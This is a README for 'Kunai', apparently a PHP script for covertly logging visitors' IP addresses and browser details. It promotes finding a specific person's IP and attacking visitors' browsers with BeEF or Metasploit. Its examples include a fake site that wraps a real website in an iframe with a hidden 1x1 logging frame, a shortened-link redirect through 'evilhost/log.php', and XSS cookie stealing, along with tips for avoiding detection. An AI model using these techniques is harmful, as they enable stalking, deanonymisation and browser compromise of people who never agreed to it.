#Kunai 0.1
Sometimes there is a need to obtain ip address of specific person. This is what you need in such situations.

Kunai is a simple script which collects many informations about a visitor and save output to file; furthermore, you may try to perform attacks on user browser, using beef or metasploit. 

In order to grab as many informations as possible, script detects whenever javascript is enabled to obtain more details about a visitor. For example, you can include this script in iframe, or perform redirects, to avoid detection of suspicious activities. Script can notify you via email about new log.

#Examples
- Fake website (more stable & better for autopwn & beef):
```
<iframe src="https://www.coloradopotguide.com/" style="border: 0; width: 100%; height: 100%"></iframe>
<iframe src="log.php" width="1" height="1" frameborder="0" ></iframe>
```
- Redirect (better for quick ip catching):
```
goo.gl/urlink -> evilhost/log.php -> site.com/kitty.png
```
- Cross Site Scripting (cookie stealing)
